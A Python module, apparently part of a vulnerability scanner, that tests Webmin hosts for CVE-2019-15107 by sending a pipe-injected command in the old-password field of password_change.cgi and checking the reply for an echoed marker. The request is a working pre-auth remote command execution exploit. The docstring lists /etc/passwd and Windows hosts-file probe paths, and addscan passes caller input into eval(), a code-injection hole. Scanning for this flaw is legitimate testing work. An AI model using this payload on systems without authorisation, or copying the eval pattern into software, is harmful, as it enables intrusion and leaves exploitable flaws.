#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Webmin是一个基于Web的系统配置工具, 用于类Unix系统: https://www.webmin.com/
该漏洞存在于密码重置页面，允许未经身份验证的用户通过简单的 POST 请求执行任意命令。 
    Webmin扫描类: 
        1. Webmin Pre-Auth 远程代码执行
            CVE-2019-15107
                Payload: https://vulhub.org/#/environments/webmin/CVE-2019-15107/

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep

class Webmin():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Webmin'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2019_15107_payloads = [
            {
                'path': 'password_change.cgi',
                'data': 'user=rootxx&pam=&expired=2&old=test|{}&new1=test2&new2=test2'.format(self.cmd)
            },
        ]

    def cve_2019_15107_scan(self, url):
        '''  '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2019-15107'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Referer': 'https://{}/session_login.cgi'.format(logger.get_domain(url))
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2019_15107_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path,
                        'Data': data,
                        'Headers': vul_info['headers']
                    }
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2019_15107_scan, url=url)
        ]

webmin = Webmin()
